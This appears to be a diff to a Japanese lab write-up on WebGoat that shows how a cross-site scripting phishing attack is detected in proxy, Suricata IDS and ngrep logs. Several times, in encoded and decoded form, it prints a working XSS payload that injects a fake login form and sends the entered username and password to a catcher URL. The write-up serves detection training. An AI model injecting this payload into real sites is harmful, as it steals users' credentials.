@@ -34,10 +34,10 @@ webgoat.cyexc-target           192.168.33.10
 10.33.168.192.in-addr.arpa     webgoat.cyexc-target
 ```
 3. $ vagrant ssh　　　   
-   i. $ cd apps/　　　　　    
-   ii.$ sudo docker-compose up --build　　　
-   iii. Browse to ht&#8203;tp://webgoat.cyexc-target/WebGoat  
-   iv. Browse to ht&#8203;tp://webgoat.cyexc-target:9292/ for arachni　　　   
+   i. $ cd apps/  <br>
+   ii.$ sudo docker-compose up --build  <br>
+   iii. Browse to ht&#8203;tp://webgoat.cyexc-target/WebGoat  <br>
+   iv. Browse to ht&#8203;tp://webgoat.cyexc-target:9292/ for arachni  <br>
 
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/images/network.png" title="ネットワーク図">
 
@@ -72,18 +72,21 @@ ex)
 3. 入力した｢ユーザIDとパスワード｣がポップアップされることを確認する。    
 
 ### proxyサーバログの検知
-vagrant@www:~/apps$ sudo docker-compose logs | grep proxy > proxy.log<br>
-[18/Jan/2018:13:02:12 +0000] **"GET /WebGoat/catcher?PROPERTY=yes&<span style="color:OrangeRed">user=test</span>&<span style="color:OrangeRed">password=test</span>** HTTP/1.1" 200 0 "ht&#8203;tp://webgoat.cyexc-target/WebGoat/start.mvc" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0" "-"<br>
+proxyサーバのログは`vagrant@www:~/apps$ sudo docker-compose logs | grep proxy > proxy.log`で取得した。
 
-ht&#8203;tp://webgoat.cyexc-target/WebGoat/start.mvc <span></span>へのGETリクエストでuserとpasswordの値が漏れていることがわかる。<br>
+
+ht&#8203;tp://webgoat.cyexc-target/WebGoat/start.mvcへのGETリクエストでuserとpasswordの値が漏れていることがわかる。<br>
+
+[18/Jan/2018:13:02:12 +0000] **"GET /WebGoat/catcher?PROPERTY=yes&<span style="color:OrangeRed">user=test</span>&<span style="color:OrangeRed">password=test</span>** HTTP/1.1" 200 0 "ht&#8203;tp://webgoat.cyexc-target/WebGoat/start.mvc" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0" "-"<br>
 
 取得したログはこちら＠[proxy.log](https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/logs/proxy.log)<br>
 
 ### IDSログの検知
-vagrant@www:~/apps$ cp /var/log/suricata/http.log .<br>
-01/18/18-13:02:12.886696 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0 HTTP/1.1 **GET webgoat.cyexc-target /WebGoat/catcher?PROPERTY=yes&<span style="color:OrangeRed">user=test</span>&<span style="color:OrangeRed">password=test</span>** 200 0 192.168.33.1:58713 -> <span style="color:Green">192.168.33.10:80</span> (proxyサーバ)<br>
+IDSのログは`vagrant@www:~/apps$ cp /var/log/suricata/http.log .`で取得した。
 
 IDSのhttpログからも、ht&#8203;tp://webgoat.cyexc-target/WebGoat/start.mvcでuserとpasswordの情報が漏れていることがわかる。<br>
+
+01/18/18-13:02:12.886696 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0 HTTP/1.1 **GET webgoat.cyexc-target /WebGoat/catcher?PROPERTY=yes&<span style="color:OrangeRed">user=test</span>&<span style="color:OrangeRed">password=test</span>** 200 0 192.168.33.1:58713 -> <span style="color:Green">192.168.33.10:80</span> (proxyサーバ)<br>
 
 取得したログはこちら＠[http.log](https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/logs/http.log)<br>
 
@@ -122,40 +125,50 @@ vagrant@webgoat:~/apps$ sudo docker cp 937fb140f393:/ngrep.log .
 ```
 
 + 192.168.0.100(proxyサーバ)でXMLHttpRequestを受信 <br>
+
+``
 T 192.168.33.1:58712 -> 192.168.0.100:80 [AP]
 POST /WebGoat/attack?Screen=1382523204&menu=900 HTTP/1.1.
 Host: webgoat.cyexc-target.
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8.
 X-Requested-With: XMLHttpRequest.
-``
 Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%3E%3Cinput+type%3D%22submit%22+name%3D%22login%22+value%3D%22login%22+onclick%3D%22hack()%22%3E%3C%2Fform%3E%3Cbr%3E%3Cbr%3E%3CHR%3E&SUBMIT=Search
 ``
+
 + 上記メッセージをnkfを使用してURLデコード (nkf -w --url-input) すると、   <br>
+
 ```
 $ echo   'Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%3E%3Cinput+type%3D%22submit%22+name%3D%22login%22+value%3D%22login%22+onclick%3D%22hack()%22%3E%3C%2Fform%3E%3Cbr%3E%3Cbr%3E%3CHR%3E&SUBMIT=Search' | nkf -w --url-input   <br>
 ```
+
 + 悪意のあるスクリプトが送られていることがわかる。    <br>
-```
+
+``
 Username=</form><script>function+hack(){+XSSImage=new+Image;+XSSImage.src="http://webgoat.cyexc-target/WebGoat/catcher?PROPERTY=yes&user="++document.phish.user.value+++"&password="+++document.phish.pass.value+++"";+alert("Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+=+"+++document.phish.user.value+++"Password+=+"+++document.phish.pass.value);}+</script><form+name="phish"><br><br><HR><H3>This+feature+requires+account+login:</H3+><br><br>Enter+Username:<br><input+type="text"+name="user"><br>Enter+Password:<br><input+type="password"+name+=+"pass"><br><input+type="submit"+name="login"+value="login"+onclick="hack()"></form><br><br><HR>&SUBMIT=Search
-```
+``
 
 + 192.168.0.100(proxyサーバ)から192.168.0.10(WebGoat)にXMLHttpRequestを送信<br>
+
+``
 T 192.168.0.100:41064 -> 192.168.0.10:8080 [A]
 POST /WebGoat/attack?Screen=1382523204&menu=900 HTTP/1.1.
 X-Real-IP: 192.168.33.1.
 Host: webgoat.cyexc-target.
 X-Requested-With: XMLHttpRequest.
-``
 Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%
 ``
+
 + 上記メッセージをnkfを使用してURLデコード (nkf -w --url-input) すると、   <br>
+
 ```
 $ echo 'Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Fwebgoat.cyexc-target%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%' | nkf -w --url-input   <br>
 ```
+
 + 悪意のあるスクリプトがWebGoatに送られていることがわかる。   <br>
-```
+
+``
 Username=</form><script>function+hack(){+XSSImage=new+Image;+XSSImage.src="http://webgoat.cyexc-target/WebGoat/catcher?PROPERTY=yes&user="++document.phish.user.value+++"&password="+++document.phish.pass.value+++"";+alert("Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+=+"+++document.phish.user.value+++"Password+=+"+++document.phish.pass.value);}+</script><form+name="phish"><br><br><HR><H3>This+feature+requires+account+login:</H3+><br><br>Enter+Username:<br><input+type="text"+name="user"><br>Enter+Password:<br><input+type="password"+name+=+"pass"><br%
-```
+``
 
 取得したログはこちら＠[ngrep.log](https://github.com/CyExc/CyExc/blob/master/2017/WebGoat/logs/ngrep.log)
 
